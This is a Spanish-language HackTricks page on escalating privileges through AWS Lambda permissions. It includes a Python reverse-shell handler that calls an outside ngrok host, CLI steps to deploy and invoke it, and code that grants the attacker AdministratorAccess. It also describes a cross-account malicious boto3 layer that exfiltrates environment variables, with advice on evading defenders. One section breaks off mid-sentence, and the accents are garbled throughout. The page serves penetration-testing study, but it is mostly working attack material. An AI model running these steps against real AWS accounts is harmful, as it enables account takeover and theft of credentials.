# AWS - Lambda Privesc

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## lambda

M谩s informaci贸n sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction`** y **`lambda:InvokeFunction`** puede **escalar privilegios pasando un rol IAM existente a una nueva funci贸n Lambda** que incluya c贸digo para importar la biblioteca AWS relevante a su lenguaje de programaci贸n elegido, y luego usarla para realizar acciones de su elecci贸n. El c贸digo podr铆a ejecutarse invocando la funci贸n a trav茅s de la API de AWS.

Un atacante podr铆a abusar de esto para obtener una **shell inversa y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('4.tcp.ngrok.io',14305))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```
{% endcode %}

```bash
# Comprime la shell inversa
zip "rev.zip" "rev.py"

# Crea la funci贸n
aws lambda create-function --function-name my_function \
    --runtime python3.9 --role <arn_del_rol_de_lambda> \
    --handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoca la funci贸n
aws lambda invoke --function-name my_function output.txt
## Si tienes el permiso lambda:InvokeFunctionUrl necesitas exponer la lambda en una URL y ejecutarla a trav茅s de la URL

# Lista los roles
aws iam list-attached-user-policies --user-name <nombre_de_usuario>
```

Tambi茅n podr铆as **abusar de los permisos del rol de lambda** desde la propia funci贸n lambda.\
Si el rol de lambda tuviera suficientes permisos, podr铆as usarlo para otorgarte permisos de administrador:

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Tenga en cuenta que aunque pueda parecer interesante, **`lambda:InvokeAsync`** **no permite por s铆 solo ejecutar `aws lambda invoke-async`**, tambi茅n necesitas `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como en el escenario anterior, puedes **otorgarte a ti mismo el permiso `lambda:InvokeFunction`** si tienes el permiso **`lambda:AddPermission`**

```bash
# Comprueba el exploit anterior y usa la siguiente l铆nea para otorgarte los permisos de invocaci贸n
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
   --action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction` y `lambda:CreateEventSourceMapping`** (y posiblemente `dynamodb:PutItem` y `dynamodb:CreateTable`), pero **sin** el permiso `lambda:InvokeFunction`, puede escalar privilegios **pasando un rol IAM existente a una nueva funci贸n Lambda** que incluya c贸digo para importar la biblioteca AWS relevante a su lenguaje de programaci贸n elegido, y luego usarla para realizar acciones de su elecci贸n. Luego tendr铆an que **crear una tabla DynamoDB o usar una existente**, para **crear un mapeo de origen de eventos para la funci贸n Lambda que apunte a esa tabla DynamoDB**. Luego tendr铆an que **poner un elemento en la tabla o esperar a que otro m茅todo lo haga para que la funci贸n Lambda sea invocada**.

```bash
aws lambda create-function --function-name my_function \
    --runtime python3.8 --role <arn_del_rol_de_lambda> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://rev.zip
```

Donde el **c贸digo** en el archivo python **utilizar铆a el rol objetivo**. Un ejemplo ser铆a el mismo script utilizado en los m茅todos anteriores.

Despu茅s de esto, el siguiente paso depende de **si se est谩 utilizando DynamoDB** en el entorno AWS actual. **Si** se est谩 **usando**, todo lo que se necesita hacer es **crear el mapeo de origen de eventos** para la funci贸n Lambda, pero si no, entonces el atacante necesitar谩 **crear una tabla con transmisi贸n habilitada** con el siguiente comando:

```bash
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

Despu茅s de este comando, el atacante **conectar铆a la funci贸n Lambda y la tabla DynamoDB** creando un mapeo de origen de eventos con el siguiente comando:

```bash
aws lambda create-event-source-mapping --function-name my_function \
    --event-source-arn <arn_de_la_transmisi贸n_de_la_tabla_dynamodb> \
    --enabled --starting-position LATEST
```

Ahora que la funci贸n Lambda y la transmisi贸n est谩n conectadas, el atacante puede **invocar la funci贸n Lambda al activar la transmisi贸n de DynamoDB**. Esto se puede hacer poniendo un elemento en la tabla DynamoDB, lo que activar谩 la transmisi贸n, usando el siguiente comando:

```bash
aws dynamodb put-item --table-name my_table \
    --item Test={S="Random string"}
```

En este punto, la funci贸n Lambda ser谩 invocada, y el atacante ser谩 hecho administrador de la cuenta de AWS.

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse a s铆 mismo (o a
### `lambda:UpdateFunctionConfiguration`

#### Introducci贸n

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **c贸digo** en su funci贸n lambda pero **almacen谩ndolo por separado**, de modo que el c贸digo de la funci贸n puede permanecer peque帽o y **varias funciones pueden compartir c贸digo**.

Dentro de lambda, puede verificar las rutas desde donde se carga el c贸digo de Python con una funci贸n como la siguiente:

```python
import json
import sys

def lambda_handler(event, context):
    print(json.dumps(sys.path, indent=2))
```

Estos son los lugares:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por ejemplo, la biblioteca boto3 se carga desde `/var/runtime/boto3` (cuarta posici贸n).

#### Explotaci贸n

**Adjuntar una capa a una funci贸n** solo requiere el permiso `lambda:UpdateFunctionConfiguration` y **las capas se pueden compartir entre cuentas**. Tambi茅n necesitar铆amos saber **qu茅 bibliotecas est谩n usando**, para que podamos anularlas correctamente, pero en este ejemplo, simplemente **asumiremos que la funci贸n atacada est谩 importando boto3**.

Solo para estar seguros, vamos a usar Pip para instalar la misma versi贸n de la biblioteca boto3 desde el tiempo de ejecuci贸n de Lambda al que apuntamos (Python 3.7), solo para que no haya nada diferente que pueda causar problemas en la funci贸n objetivo. Ese tiempo de ejecuci贸n actualmente usa la versi贸n 1.9.42 de boto3.

Con el siguiente c贸digo, instalaremos la versi贸n 1.9.42 de boto3 y sus dependencias en una carpeta local "lambda\_layer":

```
pip3 install -t ./lambda_layer boto3==1.9.42
```

A continuaci贸n, abriremos `/lambda_layer/boto3/__init__.py` y agregaremos el c贸digo malicioso. La carga 煤til que agregaremos se ve as铆:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se importa desde `botocore`. La funci贸n exfiltrar谩 las variables de entorno, y el try-except y el tiempo de espera de 0,1 est谩n all铆 para asegurarse de que este c贸digo no rompa nada.

{% hint style="info" %}
**Nota importante:** Ya no debe usar `from botocore.vendored import requests` en pruebas de penetraci贸n reales, porque se imprimir谩 una "DeprecationWarning" en los registros de CloudWatch de esa funci贸n, lo que probablemente lo har谩 atrapar por un defensor.
{% endhint %}

Ahora, empaquete ese c贸digo en un **archivo ZIP** y **c谩rguelo** en una **nueva capa Lambda en la cuenta ATACANTE**. Primero deber谩 crear una carpeta "python" y poner sus bibliotecas all铆 para que una vez que lo carguemos en Lambda, el c贸digo se encuentre en "/opt/python/boto3". Adem谩s, aseg煤rese de que la capa sea compatible con Python 3.7 y que la **capa est茅 en la misma regi贸n que nuestra funci贸n objetivo**. Una vez hecho esto, usaremos `lambda:AddLayerVersionPermission` para **hacer que la capa sea p煤blicamente accesible** para que nuestra cuenta objetivo pueda usarla. Use sus credenciales personales de AWS para esta llamada a la API.

```bash
aws lambda add-layer-version-permission --layer-name boto3 \
    --version-number 1 --statement-id public \
    --action lambda:GetLayerVersion --principal *
```

Ahora, con las **credenciales comprometidas** que tenemos, ejecutaremos el siguiente comando en nuestra funci贸n Lambda objetivo "s3-getter", que **adjuntar谩 nuestra capa Lambda entre cuentas**.

```
aws lambda update-function-configuration \
    --function-name s3-getter \
    --layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```

El siguiente paso ser铆a **invocar la funci贸n** nosotros mismos si podemos o esperar hasta que se invoque por medios normales, que es el m茅todo m谩s seguro.

Una **forma m谩s sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Tal vez con esos permisos pueda crear una funci贸n y ejecutarla llamando a la URL... pero no pude encontrar una forma de probarlo, as铆 que av铆seme si lo hace.

### Lambda MitM

Algunas lambdas van a **recibir informaci贸n confidencial de los usuarios en los par谩metros**. Si obtiene RCE en una de ellas, puede exfiltrar la informaci贸n que otros usuarios le env铆an, compru茅belo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulte los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>